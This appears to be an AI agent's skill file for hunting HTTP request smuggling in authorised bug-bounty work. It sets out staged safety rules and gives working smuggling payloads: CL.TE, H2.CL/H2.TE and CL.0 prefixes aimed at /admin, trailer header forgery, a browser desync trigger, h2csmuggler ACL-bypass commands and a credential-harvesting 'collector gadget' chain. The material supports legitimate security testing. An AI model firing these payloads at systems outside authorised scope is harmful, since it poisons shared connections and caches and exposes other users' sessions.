---
name: hunt-http-smuggling
description: "Hunt HTTP request smuggling: CL.TE, TE.CL, H2.CL, H2.TE, CL.0, client-side desync (CSD), chunk-extension and trailer differentials, response splitting. Front-end and back-end disagree on where a request ends. Tools: Burp HTTP Request Smuggler, smuggler.py, h2csmuggler. Confirm with the time-delay technique, then chain to cache poisoning, credential capture or auth bypass on a request issued by another client. Use on CDN plus origin stacks, load balancers and WAF-fronted targets."
metadata:
  sources: hackerone_public, cve_database, portswigger_research, public_research, rfc9112, rfc9113, cwe_mitre, apache_security_advisories, portswigger_web_security_academy
  report_count: 12
---

## Engagement Safety Contract (Read First — This Class Breaks Production)

Request smuggling is the easiest web vulnerability class to accidentally weaponise against innocent people. When you leave bytes on a connection that the front-end shares with other visitors, the next person to use that socket receives your prefix prepended to their request. They may get a 404, a redirect to a host you chose, an admin page, or someone else's response entirely. If a cache sits in front, your mistake is served to everyone who asks for that URL until the entry expires. None of this is theoretical and none of it is reversible by you. Treat every probe as something that can take a production site down for real users, because several of them can.

Kettle's original 2019 research says this plainly: even flawed smuggling attacks have side effects, confirmation-stage attacks can serve a poisoned response to a victim, and a live site is a poor place to learn the technique ([http-desync-attacks-request-smuggling-reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)).

### Stage A versus Stage B — classify by where the leftover bytes land

| Stage | Leftover bytes land | Probes in this stage | Authorisation |
|---|---|---|---|
| **A — detect** | Nowhere, or on **your own** connection | CL.TE timing probe; the body-less oversized-`Content-Length` probe; V-H/H-V masked-header response diffs; TLS/ALPN and `Server` fingerprinting; a reflected-CRLF canary read back in your own response; client-side desync reproduced against your own browser on a single-hop target | Standard web-app scope |
| **B — execute** | A **shared** front-end↔back-end connection, a cache, or another user's socket | TE.CL timing probe on an un-fingerprinted stack; **any probe carrying a smuggled prefix, including the server-side CL.0 two-request probe**; any complete-request smuggle; response-queue poisoning; 0.CL double-desync; pause-based desync; H2.X request splitting; cache-poisoning confirmation | **Explicit written sign-off plus a named low-traffic window.** Record the window in the report. |

**Why the CL.0 prefix probe is Stage B and not Stage A.** In a server-side CL.0 the back-end leaves your prefix on the *front-end↔back-end* socket. Sending the follow-up over your own client connection does not pin that upstream socket, so unless the front-end is connection-locked the next request to land on it can belong to someone else, and they receive your smuggled response. The only genuinely Stage A member of this family is the body-less probe — an oversized `Content-Length` with **no prefix in the body**, checking whether the server answers without waiting for the body. That produces false positives, so a hit is a hypothesis and nothing more. The one exception is a fingerprinted single-hop target during client-side desync work, where the socket really is yours.

Stage A is the default. You do not progress to Stage B because Stage A looked interesting; you progress because someone with authority wrote down that you may, and named the hour.

### Hard bounds for every looping or repeated probe

- **Serial only.** One request in flight per target. No concurrency, no Intruder threads, no `--scan-list` sweeps across a client's estate.
- **Delay: 5 seconds between probes** on the same host. Timing probes deliberately hold a back-end worker open; firing them fast is a resource-exhaustion attack with extra steps.
- **Hard cap: 20 attempts per vector per host.** If 20 attempts produce no differential, the vector is negative. Write that down and move on.
- **Stop on first signal.** The moment a probe produces a reproducible differential, stop sending that probe. Further repetition adds no evidence and multiplies the chance of poisoning a live socket.
- **Never run a smuggling scan as part of a broad automated sweep.** `h2csmuggler --scan-list` and Burp Scanner's smuggling checks against a whole scope are Stage B by volume alone.

### Cleanup and verification after any Stage B step

A poisoned connection persists for as long as the front-end keeps it open. The Web Security Academy notes a common default of closing after 100 requests, and that an attacker can trivially re-poison a fresh connection — which is also why a poisoning you did not intend does not simply go away on its own. A pause-based desync can hold a connection for the server's full timeout; PortSwigger measured 15 seconds on Varnish. A cache-poisoning landing persists for the cache TTL.

1. Smuggle an **invalid** request line (`H A X`) rather than a valid one wherever the goal is detection. A back-end that cannot parse it closes the connection, which removes the poisoned socket instead of leaving it in the pool.
2. Aim every prefix at a **harmless 404 path** (`GET /hopefully404 HTTP/1.1`), never at a mutating endpoint and never at a cacheable path unless cache poisoning is the signed-off objective.
3. Add a cachebuster query parameter to anything that could be cached.
4. After the window closes, re-request the affected paths **from a clean client on a new connection** and confirm normal status, normal body and no attacker-controlled content. Record that check. The engagement is not finished until the target is observably back to normal.

### Probe ordering is a safety control, not a preference

Send the **CL.TE timing probe before the TE.CL timing probe**, always. The TE.CL probe (`Content-Length: 6`, body `0\r\n\r\nX`) leaves the `X` on the back-end socket when the stack is actually CL.TE, which disrupts other users. The CL.TE probe is rejected by a TE.CL front-end because of its invalid chunk size, so it is safe on both stacks. The Web Security Academy states the same ordering rule for the same reason.

### Techniques marked skip-in-engagement

- **Response-queue poisoning** — every other user on the connection receives mis-paired responses, which breaks most of the site for them, and the poisoning persists. Report the reachable precondition (a complete smuggled request that the back-end answers) and stop there. Do not desynchronise a live queue.
- **0.CL deadlock as proof** — without an early-response gadget, a 0.CL probe just hangs the upstream until it 504s. A proof whose only observable is a timeout is a denial-of-service demonstration. Report the parser discrepancy instead.
- **MITM-powered pause-based desync** — requires an on-path position to delay a TCP packet. Out of scope for this bundle; do not build it.

### The `## 17.` payload below is Stage B

The `SMUGGLED` example in the next section is a classic CL.TE poisoning prefix, not a detection probe: its trailing bytes are designed to land on a shared socket. Use the timing probes in **Payload & Detection Patterns** for discovery, and treat that block as something you send only under Stage B sign-off.

---

## Crown Jewel Targets

Smuggling pays where a request crosses a trust boundary that rewrites it. Priority order:

- **CDN or WAF in front of an origin that speaks HTTP/1.1 upstream.** The downgrade hop is where almost all 2022-2026 findings live. PortSwigger's 2025 survey lists HAProxy, F5 BIG-IP, Google Cloud, Imperva, Cloudflare (HTTP/1 internally) and experimental Apache as front-ends that can speak upstream HTTP/2, and nginx, Akamai, CloudFront and Fastly as ones that cannot — the latter group means a guaranteed downgrade.
- **Front-ends that enforce authentication or routing ACLs** (`/admin/*` blocked at the edge, SSO enforced by the proxy). A smuggled request is opaque to those rules, so the finding is auth bypass, not a parsing curiosity.
- **Front-ends that inject trusted internal headers** (`X-Forwarded-For`, `X-Real-IP`, account/tenant identifiers, "is-admin" style flags). Request tunnelling and trailer injection both let you forge them.
- **Caching layers.** One smuggled response becomes every subsequent visitor's response for the TTL. This is the single highest-impact chain — see `hunt-cache-poison`.
- **Shared wildcard-certificate estates behind one reverse proxy.** First-request routing plus browser connection coalescing is connection contamination: a weak subdomain reaches a strong one's back-end.
- **Single-server HTTP/1.1 sites with no proxy at all.** Client-side desync needs no proxy chain, only an endpoint that ignores `Content-Length`.
- **HTTP/2 forward proxies that honour `CONNECT`.** A `:method CONNECT` stream per `:authority host:port` turns one multiplexed connection into an internal port scanner (200 = open, 503 / error body / `RST_STREAM` = closed); shown against Envoy and Apache httpd in "Playing with HTTP/2 CONNECT" (fl0mb, Sep 2025, https://blog.flomb.net/posts/http2connect/, PortSwigger Top 10 of 2025 entry 9). One probe to one in-scope internal port is the proof; a sweep is a scan and needs scope sign-off. Chain through `hunt-ssrf`.

---

## 17. HTTP REQUEST SMUGGLING
> Lowest dup rate. $5K–$30K. PortSwigger research by James Kettle.

### CL.TE (Content-Length front, Transfer-Encoding back)
```http
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### Detection
```
1. Burp extension: HTTP Request Smuggler
2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
3. Manual timing: CL.TE probe + ~10s delay = backend waiting for rest of body
```

### Impact Chain
```
Poison next request → access admin as victim
Steal credentials → capture victim's session
Cache poisoning → stored XSS at scale
```

---

## Target-Suitability Matrix (2026 reality check)

The classic CL.TE / TE.CL payloads are NOT universally exploitable in 2026. Modern proxies are RFC 9112 strict by default. Fingerprint the front-end BEFORE investing time.

| Front-end | CL.TE | TE.CL | H2.CL | H2.TE | Notes |
|---|---|---|---|---|---|
| **Nginx ≥ 1.21** | NO | NO | partial (H2 ingress) | partial | RFC-strict; rejects CL+TE with HTTP 400. Verified locally on Nginx 1.27 — all 9 documented variants killed by front-end ([docs/verification/phase2h-smuggling-cachepoison.md](../../docs/verification/phase2h-smuggling-cachepoison.md)). |
| **Caddy 2.x** | NO | NO | — | — | Hardened by default |
| **Envoy ≥ 1.20** | NO | NO | partial | partial | Hardened in most paths |
| **HAProxy ≤ 2.4** | ✓ | ✓ | — | — | **Vulnerable**, see CVE-2021-40346 |
| **AWS ALB + specific upstream** | partial | partial | ✓ | ✓ | Several disclosed-paid reports 2022-2024. AWS left the 2025 ALB+IIS desync unpatched for compatibility; the remediation to cite is `routing.http.drop_invalid_header_fields.enabled = true` plus `routing.http.desync_mitigation_mode = strictest` (Kettle, "HTTP/1.1 must die", Aug 2025) |
| **Cloudflare (internal HTTP/1 hop)** | — | — | — | — | The 2025 H2.0 desync internal to Cloudflare's infrastructure (Pingora, per the linked Cloudflare post-mortem) was patched within hours ($7,000 bounty, post-mortem published; same paper). No open vector known — test the origin behind it, not the edge |
| **Older F5 BIG-IP (TMM < 16)** | ✓ | — | — | — | Vendor advisories |
| **Citrix ADC / NetScaler (older firmware)** | ✓ | ✓ | — | — | Disclosed in 2020-2022 |
| **Squid 3.x** | ✓ | — | — | — | Older deployments |
| **Apache Traffic Server (older)** | ✓ | ✓ | ✓ | ✓ | PortSwigger research |
| **Apache mod_proxy_ajp → Tomcat** | — | — | — | — | Cross-protocol HTTP→AJP desync (CVE-2022-26377); smuggled request is opaque to the WAF and reaches internal AJP admin/status paths that lack the external auth controls |
| **Custom Python / Go proxies** | ✓ | ✓ | — | — | Frequently miss RFC enforcement |

### Operator fingerprint quick-check

```bash
curl -sI https://target/ | grep -i "Server:"
```

- `nginx/1.21+`, `Caddy`, `envoy` → CL/TE classic is dead — pivot to H2.CL/H2.TE if the front-end speaks HTTP/2, or look for legacy proxies upstream
- `HAProxy`, header points to AWS/CDN → run the full payload matrix
- No Server header → assume hardened, but run a single quick `space-before-colon` probe; if it doesn't 400, dig deeper

### H2.CL / H2.TE (the modern dominant vector)

H2-downgrade smuggling attacks rely on the front-end speaking HTTP/2 to the client and HTTP/1.1 to origin. The downgrade introduces CL/TE confusion because HTTP/2's frame-length headers don't survive the conversion cleanly. Most CDN+origin chains in 2024-2026 use this exact topology.

Tools that send HTTP/2 raw frames (Burp Pro's HTTP Request Smuggler extension, `h2csmuggler`, `smuggler.py`) are the right starting point against CDN-fronted targets. Avoid HTTP/1.1-only test clients (curl, raw sockets) against H2-front-ended targets — you'll send the wrong protocol entirely.

### Mass credential harvesting — the "collector gadget"
The highest-impact smuggling outcome needs no per-victim interaction. Instead of blindly poisoning the queue, smuggle a request aimed at a **back-end handler that echoes the full request** — a search endpoint that reflects headers, or a redirect that mirrors the request line. The next victim's headers (`Cookie`, `Authorization`, `X-Access-Token`) get attributed to your smuggled request, and the reflecting handler returns them **in a response you read**. Repeated on a busy keep-alive socket, this harvests live credentials from arbitrary users at scale — and it works even through a CDN (Akamai/Cloudflare) when the CDN↔origin hop desyncs. Chains to `hunt-ato`.

---

## OOB/Confirmation Gate

There is no Collaborator callback for this class. A desync is a **parser disagreement between two hops**, so the only valid proof is a differential that one hop produces and the other does not, observed on a request path you can attribute.

### What is NOT confirmation

- **A timing difference measured once.** A single slow response is noise: DNS, a cold Lambda, a GC pause, an autoscaler, a rate limiter or a bored load balancer all produce multi-second outliers. One sample cannot distinguish a desync from weather.
- **A proof of concept that only works when you reuse the connection.** PortSwigger's [false false-positive](https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling) paper is explicit: if your PoC needs connection reuse, it is probably HTTP/1.1 pipelining — your own client stacking two requests on one socket — and not smuggling at all. Build every PoC with connection reuse disabled.
- **A 400, 404 or 500 that differs from baseline.** Status alone proves the front-end parsed something differently, not that the back-end accepted a second request.
- **A `Connection: close` or a 504.** That is the upstream giving up, which is the signature of a deadlock, not of a successful smuggle.

### What IS confirmation

- **A repeated timing differential.** Baseline the endpoint with **5 control requests** (identical request, valid `Content-Length`, no `Transfer-Encoding`), record max control latency, then send the probe **3 times at 5-second spacing**. The probe delay must exceed the control maximum on **every** repetition and by a margin that no control sample approaches. Two out of three is a negative result.
- **A differential response attributable to a prefix *by canary*.** Every valid prefix carries a per-probe nonce in its path (`GET /404-<NONCE>`). The follow-up must return **that exact path's** response, on a **different connection** from the setup request, and the body must body-diff against the step-2 baseline in the way the nonce predicts. Without the nonce a WAF block page, a generic error page or an unrelated 404 handler fakes the result perfectly, which is why "the follow-up 404'd" is not on its own evidence of anything.
- **An HTTP/1 response nested inside an HTTP/2 response body.** This is the confirmation method for request *tunnelling*, where the front-end never reuses back-end connections so the classic "affect another user" test can never succeed.
- **Burp's "Smuggling or pipelining?" custom action** (`SmugglingOrPipelining.bambda`, installable into Repeater directly or via the Extensibility Helper BApp) agreeing with your reading, plus the HTTP Hacker BApp showing the low-level socket behaviour.

### Below that bar it is a hypothesis, not a finding

Write it in the notes as **"hypothesis: suspected CL.TE on <hop>, 1/3 repetitions, unattributed"** and leave it there. Do not open a report, do not tell the client they have a smuggling vulnerability, and do not escalate to Stage B on the strength of it. Three legitimate classes — connection-locked request smuggling, connection-state attacks and client-side desync — *do* require connection reuse, so a reuse-dependent result is not automatically dead; it is merely unproven until you have identified which of those three it is and confirmed it on its own terms.

---

## Attack Surface Signals

```bash
# 1. Which protocol does the edge speak, and is there a hidden h2 listener?
curl -sI --http2 https://target.example/ -o /dev/null -w '%{http_version}\n'
#    Hidden h2 (edge speaks h2 but does not offer it in ALPN): HTTP Request Smuggler's
#    "HTTP/2-hidden probe" forces h2 and compares. curl's --http2-prior-knowledge only
#    applies to cleartext h2c ports — see hunt-tls-network.
#    h2 to the client + a Server header naming a non-upstream-h2 front-end
#    (nginx, Akamai, CloudFront, Fastly) = a guaranteed HTTP/1.1 downgrade hop.

# 2. How many hops, and who rewrites?
curl -sI https://target.example/ | grep -iE '^(server|via|x-cache|x-served-by|cf-ray|x-amz-cf-id|x-akamai):'

# 3. Shared-IP / wildcard-cert estate (connection-contamination precondition)
openssl s_client -connect target.example:443 -servername target.example </dev/null 2>/dev/null \
  | openssl x509 -noout -text | grep -A2 'Subject Alternative Name'
```

Surface markers worth logging:

- **A downgrade hop.** HTTP/2 or HTTP/3 to the client, HTTP/1.1 to origin. This is the dominant 2026 vector.
- **Endpoints that do not expect a body** — static files (`/robots.txt`, `/favicon.ico`, `/sitemap.xml`), server-level redirects (`/assets` → `/assets/`), and error paths triggered by an overlong URL or a semi-malformed path (`/%2e%2e`, `/%2f`). These are the CL.0 and client-side-desync candidates, because such handlers tend to answer without reading the body off the socket.
- **An early-response gadget.** Any path that replies before the body arrives and keeps the connection open. On IIS, a Windows reserved device name such as `/con` does this; on several other servers a server-level redirect does. PortSwigger found no usable gadget on Apache.
- **A wildcard certificate plus several hostnames on one address.** Precondition for connection contamination.
- **Front-end-injected headers visible in a reflection gadget** — a search page or error page that echoes the raw request shows you what the edge adds, which is what tunnelling and trailer injection let you forge.
- **Hop-by-hop header handling.** A front-end that honours `Connection: X-Trusted-Header` strips the header before the origin sees it; tiers that disagree about which headers are hop-by-hop desync. See `hunt-cache-poison` for the Akamai edge case.

---

## Step-by-Step Methodology

1. **Fingerprint before you probe.** Run the three commands above, then read the Target-Suitability Matrix. A RFC-9112-strict front-end kills the classic variants outright, and probing it anyway spends attempts and risk for nothing.
2. **Baseline.** Five control requests to the chosen endpoint, connection reuse off, recording status, length and latency. Save the body. Everything later is a diff against this.
3. **Stage A — CL.TE timing probe.** Send it first, always (see the safety contract). In Burp Repeater, uncheck **Update Content-Length** first, or the tool rewrites your probe into a valid request.
4. **Stage A — TE.CL timing probe.** Only after the CL.TE probe came back negative, and only on a front-end you have fingerprinted. On an unknown stack this probe is Stage B.
5. **Stage A — header-masking differential (V-H / H-V).** Send four variants of the same request: normal `Host`, no `Host`, a masked `Host` (space before the field name), and a masked arbitrary header. A response that appears *only* for the masked variant proves one hop sees a field the other does not. Whether that is **V-H** (visible to the front-end, hidden from the back-end) or **H-V** (the reverse) you infer from which hop answered. Status codes do not matter; only the difference does.
6. **CL.0 / H2.0, in two parts.** *Stage A:* send a POST with an oversized `Content-Length` and **no prefix in the body**, and check whether the server responds without waiting for the body. *Stage B, sign-off required:* only then send the two-request version — setup request with an accurate `Content-Length` whose body is a partial request, then a follow-up. In Repeater: two tabs, add to a group in order, set the send mode to **Send group in sequence (single connection)**, set `Connection: keep-alive`. Use an **invalid** prefix (`H A X`) for detection so the back-end closes the connection; use a valid prefix plus a nonce only when impact is the signed-off objective.
7. **Stage A — connection-state probe.** Send request 1 for an allowed host, request 2 for an internal or sibling host, on one connection. If request 2 is served, the front-end validated or routed on the first request only. HTTP Request Smuggler 3.0 automates this as its **Connection-State** attack. Chain the Host-header consequences through `hunt-host-header`.
8. **Stage A — client-side desync probe.** Confirm the CL.0 behaviour in Burp first, then reproduce it in Chrome with DevTools open, **Preserve log** on and the **Connection ID** column enabled. The target must not negotiate HTTP/2 with the browser, since browsers prefer h2 and h2 blocks this; the exception is a victim behind an HTTP/1.1-only forward proxy.
9. **Stage A — Expect-based probe.** Add `Expect: 100-continue` to the setup request, then the obfuscated form (`Expect: y 100-continue`) if the valid one changes nothing. Mishandling of the two-phase exchange is a desync source in its own right, and the obfuscated variant fires where the vanilla one does not.
10. **Stage B — impact, in this order.** Only under sign-off. (a) If a cache exists, attempt cache poisoning with a cachebuster. (b) Otherwise use an input-reflection gadget to reveal front-end-injected headers. (c) Attempt to bypass a named front-end security control. (d) Test Host-header tampering, directly and inside the smuggled request. This is PortSwigger's recommended escalation order and it goes from least to most disruptive.
11. **Clean up and verify.** Run the four-step cleanup from the safety contract and record the result.

**Stage B whenever `prefix` is non-empty — same reasoning as the CL.0 probe.**

```python
# Turbo Intruder, connection-locked confirmation. Settings verified against the
# upstream example scripts (resources/examples/0cl-poc.py, http2.py).
engine = RequestEngine(endpoint=target.endpoint,
                       concurrentConnections=1,     # serial: never widen this on a live target
                       requestsPerConnection=2,     # setup + follow-up on one socket
                       engine=Engine.BURP,          # Engine.BURP2 for Burp's native HTTP/2 stack
                       pipeline=False,              # pipelining is the false-positive source
                       maxRetriesPerRequest=0,      # a retry re-sends a poisoning prefix
                       timeout=15)
```

With either HTTP/2 engine, Turbo Intruder rewrites `^` to `\r`, `~` to `\n` and `` ` `` to `:`, and lets you override pseudo-headers by writing them as ordinary headers (`:path: /robots.txt`). That is how you place a raw CRLF inside an HTTP/2 header value from a script.

---

## Payload & Detection Patterns

### Timing probes (send CL.TE first)

**Stage A — safe on both stacks. This is the discovery probe.**

```http
POST / HTTP/1.1
Host: target.example
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```
Front-end uses `Content-Length`, forwards 4 bytes and drops the `X`. Back-end uses `Transfer-Encoding`, consumes chunk `A`, waits for the next chunk size, times out. Safe on a TE.CL stack because the front-end rejects the leftover as an invalid chunk size.

**Stage B unless the front-end is already fingerprinted as non-CL.TE. Send only after the probe above came back negative.**

```http
POST / HTTP/1.1
Host: target.example
Transfer-Encoding: chunked
Content-Length: 6

0

X
```
Front-end uses `Transfer-Encoding` and stops at the terminator; back-end uses `Content-Length: 6`, waits for bytes that never arrive, times out. **On a CL.TE stack this leaves `X` on the shared back-end socket.** Second, never first.

### CL.0 / H2.0 — no header tampering at all

**Stage A — body-less. No prefix leaves your connection.**

```http
POST /robots.txt HTTP/1.1
Host: target.example
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

```
Send the headers, withhold the body, and watch whether a response arrives anyway. It frequently false-positives, so a hit is a hypothesis.

**Stage B — carries a prefix onto a shared upstream socket. Sign-off and window required.**

```http
POST /robots.txt HTTP/1.1
Host: target.example
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

GET /404-a7f3c1 HTTP/1.1
Foo: x
```
`Content-Length: 32` is exact: 24 bytes of request line, 2 bytes of CRLF, 6 bytes of `Foo: x`. Recompute it for your own nonce with `printf 'GET /404-<NONCE> HTTP/1.1\r\nFoo: x' | wc -c` — a wrong count turns a detection probe into a different attack. `a7f3c1` is a **per-probe canary**: it is what makes the follow-up's 404 attributable to you rather than to a WAF, an error page or an unrelated 404 handler. The follow-up must return that exact path's response, and the body must differ from the step-2 baseline in the way the nonce predicts. For pure detection use `H A X` as the prefix instead, so the back-end closes the connection rather than keeping a poisoned one. H2.0 is the same bug reached through an HTTP/2 downgrade.

### H2.CL and H2.TE (pseudo-header view)

**Stage B — both blocks deliver a complete smuggled request. Sign-off required.**

```
:method   POST
:path     /example
:authority target.example
content-length  0

GET /admin HTTP/1.1
Host: target.example
Content-Length: 10

x=1
```
The HTTP/2 request declares `content-length: 0` while its DATA frames carry the prefix; the downgraded HTTP/1 request then carries whatever length the front-end failed to correct. The smuggled prefix's own `Content-Length: 10` is deliberately longer than `x=1`, so the victim's appended request is truncated before its own headers — the Academy's tip, and the reason the prefix does not simply get discarded.

```
:method   POST
:path     /example
:authority target.example
transfer-encoding  chunked

0

GET /admin HTTP/1.1
Host: target.example
Foo: bar
```
RFC 9113 §8.2.2 names `Transfer-Encoding` as connection-specific, says an endpoint **MUST NOT** generate an HTTP/2 message containing it, and requires any message that does to be **treated as malformed**. §8.1.1 then requires that intermediaries **MUST NOT forward a malformed request**. H2.TE exists wherever a front-end ignores both requirements.

### HTTP/2-exclusive vectors and CRLF injection — see references/

The CRLF and bare-LF discrepancies, HTTP/2 request splitting, the pseudo-header abuse matrix (`:method`, `:scheme`, `:path`, `:authority`, header-name injection) and response-side CRLF injection / response splitting (CWE-113) are in `references/h2-exclusive-vectors.md`. Read it before probing any HTTP/2 front-end, because those vectors survive front-ends that already block H2.CL and H2.TE.

| File | Coverage | Trigger phrases |
|---|---|---|
| references/h2-exclusive-vectors.md | Bare-LF and CRLF header discrepancies; H2.X request splitting; `:method` / `:scheme` / `:path` / `:authority` and header-name injection; response splitting and header injection (CWE-113) with a Stage A canary probe | h2 downgrade, pseudo-header injection, request splitting, CRLF injection, response splitting, header injection |
| references/chunked-and-crlf-desync.md | Funky Chunks TERM.EXT / EXT.TERM / spill classes with the CVE table; CRLF-powered desync via nginx `$uri`, browser delivery, status-code detection probes with stage labels, scanner and nuclei templates, whitebox grep | bare LF chunk, chunk extension, chunk spill, funky chunks, Kestrel smuggling, CVE-2025-55315, CRLF desync, nginx $uri, proxy_pass |

### Chunk extensions and the trailer section

**Stage B — the trailer form forges headers the front-end stripped, so it reaches the back-end as a privileged request. Sign-off required. Replace `<stripped-internal-header>` with a name you actually observed the front-end inject; do not guess one.**

```http
POST /x HTTP/1.1
Host: target.example
Transfer-Encoding: chunked

1;name=value
A
0
X-Forwarded-For: 127.0.0.1
<stripped-internal-header>: <value>

```
RFC 9112 §7.1.1 requires a recipient to **ignore unrecognized chunk extensions**, so a hop that chokes on `;name=value` instead of ignoring it is a parser differential you can measure. RFC 9112 §7.1.2 requires that a recipient **MUST NOT merge a received trailer field into the header section** unless that field's definition allows it. A server that merges anyway accepts, via the trailer, headers the front-end already stripped from the header section. Apache Traffic Server forwarded malformed chunked trailer sections to origins in 8.0.0-8.1.10 and 9.0.0-9.2.4 ([CVE-2024-35161](https://security.apache.org/projects/trafficserver/CVE-2024-35161.cve.json), CWE-444, fixed in 8.1.11 / 9.2.5, mitigable with `proxy.config.http.drop_chunked_trailers`).

### Chunk-line terminators, spills and CRLF-powered desync — see references/

Two newer families survive front-ends that already reject `CL`+`TE`, because neither needs a duplicate length header:

- **Funky Chunks** (Jeppe Bonde Weikop, Jun 2025): hops disagree on a bare LF / bare CR inside a chunk-size line or chunk extension, or on chunk data longer than its declared size. CVE-2025-22871 (Go `net/http`), CVE-2025-4600 (Google Cloud Classic ALB), CVE-2025-43859 (h11), and later in the same family CVE-2025-55315 (ASP.NET Core Kestrel) and CVE-2025-66373 (Akamai Ghost).
- **CRLF-powered desync** (PortSwigger, 5 Aug 2026): nginx `proxy_pass http://backend$uri;` decodes `%0d%0a` from the path into the upstream request. The trigger is a plain URL, so it is browser-deliverable.

Probe shapes, stage labels, the CVE table and tooling (`t0xodile/crlf-powered-desync-scanner`, `turtlesec-software/crlf-desyncs` nuclei templates) are in `references/chunked-and-crlf-desync.md`.

### Expect-based desync

**Stage B — this is the 0.CL setup half. Without an early-response gadget it deadlocks the upstream until it 504s, which is a denial of service, not a proof. Sign-off and a named window.**

```http
POST /x HTTP/1.1
Host: target.example
Content-Length: 123
Content-Type: application/x-www-form-urlencoded
Expect: 100-continue
Connection: keep-alive

```
`Expect: 100-continue` splits a request into headers-then-body. Hops that handle the two phases differently desync. If the valid header does nothing, try the obfuscated form `Expect: y 100-continue`. A second effect worth checking: `Expect` can elicit a second response header block, which bypasses a front-end that strips sensitive headers from the first one.

### Client-side desync trigger (victim's own browser)

**Stage A against your own browser on a single-hop target. Stage B the moment it is hosted anywhere another person could load it — at that point it desyncs their connection, not yours.**

```javascript
fetch('https://target.example/vulnerable-endpoint', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x', // the prefix
    mode: 'no-cors',          // keeps the connection ID visible in DevTools
    credentials: 'include'    // poisons the with-cookies connection pool
}).then(() => {
    location = 'https://target.example/'  // navigates over the poisoned connection
})
```
The attacker controls only the URL, the body, and partial `Referer` and `Content-Type` — no custom headers. Browsers keep separate pools for requests with and without cookies, and `credentials: 'include'` is what targets the one that matters.

### Connection contamination

Preconditions: browser connection coalescing (same IP address plus a certificate valid for both hostnames; HTTP/3 proposes dropping the IP requirement, which widens this considerably) **and** first-request routing on the front-end. Paired `fetch()` calls with `credentials: 'include'` to two hostnames, then check in DevTools whether the second shows an **Initial connection** time and whether its **Connection ID** matches the first. A shared ID plus a response from the wrong back-end is the finding: XSS on a weak subdomain executes in the context of a strong one under the same wildcard certificate.

### h2c (Upgrade) smuggling — a different bug with a similar name

```bash
# Stage A — detection only. Tests whether the proxy forwards h2c upgrade headers.
./h2csmuggler.py -x https://target.example/api/ --test

# Stage B — this tunnels a request past the proxy's ACL. Sign-off required.
./h2csmuggler.py -x https://target.example/api/ -X GET -H 'X-Forwarded-For: 127.0.0.1' https://target.example/admin
```
Verified flags: `--test`/`-t`, `-x/--proxy`, `-X/--request`, `-H/--header`, `-d/--data`, `-i/--wordlist`, `-m/--max-time` (default 10s), `--upgrade-only`, `--scan-list`, `--threads`, `-v`. **Do not use `--scan-list` or `--threads` in an engagement** — serial only. This is `Upgrade: h2c` tunnelling through a proxy, not HTTP/2 downgrade smuggling; the project's own lab proxies were HAProxy (default config), nginx (custom config) and Nuster chained to HAProxy. A front-end should never forward a client-supplied `Upgrade` or `Connection` value.

**The generalisation worth probing: premature upgrade passthrough.** RFC 9110 §7.8 is explicit that `Upgrade` "cannot be used to insist on a protocol change" and that a server **MAY ignore** it — the switch is real only once the server answers `101 Switching Protocols`. A proxy that enters raw-tunnel mode the moment it *sees* an `Upgrade` header in the request has therefore treated a client hint as authoritative. It then stops parsing, and everything after the first request crosses to the back-end as raw bytes from the proxy's trusted address. Test **any** `Upgrade` value, not just `h2c`, and determine whether the switch happens before or after the back-end's `101`. Stage A is the observation that an arbitrary `Upgrade` token changes the proxy's framing behaviour; appending a second request to exploit it is Stage B.

---

## Common Root Causes

- **`Content-Length` and `Transfer-Encoding` both present, handled differently.** RFC 9112 §6.1 says that when both appear the server may reject the message or process it using `Transfer-Encoding` alone, and that regardless of which it chooses it **MUST close the connection after responding**. §6.3 makes `Transfer-Encoding` override `Content-Length`, and requires a recipient faced with an unresolvable length to treat it as an **unrecoverable error** — for a request, **respond 400 and close the connection**. Every CL.TE and TE.CL finding is a hop that skipped one of those requirements.
- **The downgrade is a re-serialisation.** HTTP/2 carries length in the framing layer, so `content-length` and `transfer-encoding` are redundant there. A front-end that rewrites h2 to HTTP/1.1 must synthesise a correct length and strip anything contradicting it. H2.CL, H2.TE and H2.0 are all the same omission.
- **Binary framing has no delimiters.** `\r\n` is an ordinary byte pair inside an HTTP/2 header value and a structural delimiter inside an HTTP/1 one. RFC 9113 §8.2.1 says so outright — "Failure to validate fields can be exploited for request smuggling attacks" — and sets the minimal validation: a field value **MUST NOT** contain NUL, LF or CR at any position; a field name **MUST NOT** contain bytes in `0x00-0x20`, `0x41-0x5a` (uppercase) or `0x7f-0xff`, and **MUST NOT** include a colon unless it is a pseudo-header. Every H2-exclusive vector in this skill is one of those four rules going unenforced. §8.1.1 adds that a `content-length` not equal to the sum of DATA frame payload lengths is malformed, and that an intermediary **MUST NOT forward a malformed request**.
- **Validation that runs once per connection.** First-request validation and first-request routing both assume every request on a connection shares the first one's Host. Keep-alive and coalescing break that assumption.
- **Handlers that answer without draining the socket.** An endpoint that does not expect a body, a server-level redirect, or an error path that responds and leaves the connection open produces CL.0 and client-side desync. No header tampering is involved, which is why these are invisible to a WAF.
- **Trailers and chunk extensions treated as header material.** Covered above: RFC 9112 §7.1.1 and §7.1.2.
- **`Expect: 100-continue` state machines implemented twice, differently.**

---

## Bypass Techniques

Transfer-Encoding obfuscation variants, each of which Kettle reported working against at least one real system:

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding:[tab]chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
X: X[\n]Transfer-Encoding: chunked
```
Three of the seven are **line folds**, where the structural byte is a newline followed by leading whitespace. They do not survive being written on one line, so they are given here as explicit byte sequences:

| Fold | Exact bytes | What it hides |
|---|---|---|
| Header folded onto the request line | `GET / HTTP/1.1` `\n` `<SP>` `Transfer-Encoding: chunked` | A parser that does not unfold sees only the request line |
| Fold before the colon | `Transfer-Encoding` `\n` `<SP>` `: chunked` | Splits the field name from its colon |
| Fold before the value (the PayPal case) | `Transfer-Encoding:` `\n` `<SP>` `chunked` | Made the header invisible to the front-end CDN |

